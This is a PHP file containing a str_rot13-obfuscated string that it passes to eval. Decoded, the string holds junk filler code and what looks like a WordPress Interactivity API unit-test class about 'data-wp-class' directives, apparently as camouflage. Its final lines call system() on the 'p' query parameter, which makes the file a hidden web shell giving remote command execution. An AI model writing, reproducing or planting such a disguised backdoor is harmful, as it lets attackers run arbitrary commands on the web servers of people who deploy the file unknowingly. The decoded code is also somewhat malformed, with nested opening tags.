<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_pynff_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Pynff rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'gehr'  => gehr,
				'snyfr' => snyfr,
			)
		);
	}

	/**
	 * Vaibxrf gur `cebprff_qverpgvirf` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $ugzy Gur UGZY gung arrqf gb or cebprffrq.
	 * @erghea neenl Na neenl pbagnvavat na vafgnapr bs gur JC_UGZY_Gnt_Cebprffbe naq gur cebprffrq UGZY.
	 */
	cevingr shapgvba cebprff_qverpgvirf( $ugzy ) {
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt();
		erghea neenl( $c, $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-pynff` nqqf n pynff jura gur pbaqvgvba vf gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_frgf_pynff_anzr() {
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung `qngn-jc-pynff` pna nqq zhygvcyr pynffrf onfrq ba gehr
	 * pbaqvgvbaf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_frgf_zhygvcyr_pynff_anzrf() {
		$ugzy    = '
			<qvi
				qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\"
				qngn-jc-pynff--bgure-pynff=\"zlCyhtva::fgngr.gehr\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf unaqyvat bs nqqvat bar naq abg nqqvat nabgure pynff onfrq ba
	 * qvssrerag obbyrna inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_unaqyrf_zhygvcyr_pynff_anzrf_jvgu_qvssrerag_inyhrf() {
		$ugzy    = '
			<qvi
				qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\"
				qngn-jc-pynff--bgure-pynff=\"zlCyhtva::fgngr.snyfr\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );

		$ugzy    = '
			<qvi
				pynff=\"bgure-pynff\"
				qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\"
				qngn-jc-pynff--bgure-pynff=\"zlCyhtva::fgngr.snyfr\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung `qngn-jc-pynff` nqqf arj pynffrf nybatfvqr rkvfgvat barf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_frgf_pynff_anzr_jura_pynff_nggevohgr_rkvfgf() {
		$ugzy    = '<qvi pynff=\"bgure-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung ab pynff vf nqqrq jura gur nffbpvngrq fgngr vf snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_nqq_pynff_nggevohgr_ba_snyfr() {
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung rkvfgvat pynff anzrf ner cerfreirq jura gur qverpgvir pbaqvgvba
	 * vf snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_nqq_pynff_anzr_ba_snyfr() {
		$ugzy    = '<qvi pynff=\"bgure-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung rkvfgvat pynff anzrf erznva vagnpg jura gurl fubhyq or er-nqqrq
	 * nf cre gurve qverpgvir.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_xrrcf_pynff_anzr_jura_pynff_anzr_rkvfgf() {
		$ugzy    = '<qvi pynff=\"fbzr-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf cerfreingvba bs rkvfgvat pynff anzrf, rira jura bar vf ercrngrq va n
	 * qverpgvir gung rinyhngrf gb gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_xrrcf_pynff_anzr_jura_pynff_anzr_rkvfgf_naq_vf_abg_gur_bayl_bar() {
		$ugzy    = '<qvi pynff=\"bgure-pynff fbzr-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung n pynff nggevohgr jvgu bayl bar pynff anzr vf erzbirq jura gur
	 * qverpgvir rinyhngrf gb snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_erzbirf_pynff_nggevohgr_jura_pynff_anzr_rkvfgf_naq_vf_gur_bayl_bar() {
		$ugzy    = '<qvi pynff=\"fbzr-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung bar bs frireny pynff anzrf vf erzbirq jura vgf qverpgvir
	 * rinyhngrf gb snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_erzbirf_pynff_anzr_jura_pynff_anzr_rkvfgf_naq_vf_abg_gur_bayl_bar() {
		$ugzy    = '<qvi pynff=\"bgure-pynff fbzr-pynff\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung na rzcgl pynff nggevohgr vf abg erzbirq rira vs n qverpgvir
	 * rinyhngrf gb snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_erzbir_rzcgl_pynff_nggevohgr() {
		$ugzy    = '<qvi pynff qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregGehr( $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung gur pynff nggevohgr erznvaf hapunatrq vs gur qngn-jc-pynff
	 * fhssvk vf rzcgl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_punatr_pynff_nggevohgr_jvgu_rzcgl_qverpgvir_fhssvk() {
		$ugzy    = '<qvi pynff=\"bgure-pynff\" qngn-jc-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung gur pynff nggevohgr vf abg nygrerq vs gur inyhr bs gur
	 * `qngn-jc-pynff` qverpgvir vf rzcgl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_punatr_pynff_nggevohgr_jvgu_rzcgl_inyhr() {
		$ugzy    = '<qvi pynff=\"bgure-pynff\" qngn-jc-pynff--fbzr-pynff=\"\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung na rkvfgvat pynff nggevohgr vf abg nssrpgrq ol n `qngn-jc-pynff`
	 * qverpgvir jvgubhg n inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_pynff_qbrfag_punatr_pynff_nggevohgr_jvgubhg_inyhr() {
		$ugzy    = '<qvi pynff=\"bgure-pynff\" qngn-jc-pynff--fbzr-pynff>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung zhygvcyr qverpgvirf sbe gur fnzr pynff lvryq gur pbeerpg erfhyg
	 * jura gur pbaqvgvba vf gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_jbexf_jvgu_zhygvcyr_qverpgvirf() {
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\" qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.gehr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf frggvat pynff anzrf onfrq ba gehgul inyhrf bgure guna whfg gehr
	 * obbyrnaf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_frgf_pynff_anzr_ba_gehgul_inyhrf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'grkg' => 'fbzr grkg' ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'neenl' => neenl( 1, 2 ) ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.neenl\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahzore' => 1 ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.ahzore\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
	}

	/**
	 * Grfgf gung pynff nggevohgrf nera'g frg sbe snyfl inyhrf bgure guna whfg
	 * snyfr obbyrnaf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pynff_frgf_pynff_anzr_ba_snyfl_inyhrf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'grkg' => '' ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'neenl' => neenl() ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.neenl\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahzore' => 0 ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.ahzore\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahyy' => ahyy ) );
		$ugzy    = '<qvi qngn-jc-pynff--fbzr-pynff=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'pynff' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>